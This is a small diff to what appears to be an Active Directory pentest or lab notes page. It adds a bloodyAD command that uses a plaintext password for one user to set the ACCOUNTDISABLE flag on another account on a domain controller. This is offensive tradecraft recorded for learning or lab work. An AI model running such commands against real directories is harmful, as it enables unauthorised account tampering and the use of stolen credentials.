@@ -16,3 +16,10 @@ bloodyAD --host DC-CC.city.local -d 'city.local' -u 'emma.hayes' -p '!Gemma4Jame
 ```
 {% endcode %}
 
+If we want to disable it back
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD --host DC-CC.city.local -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' add uac 'sam.brooks' -f ACCOUNTDISABLE                     
+```
+{% endcode %}
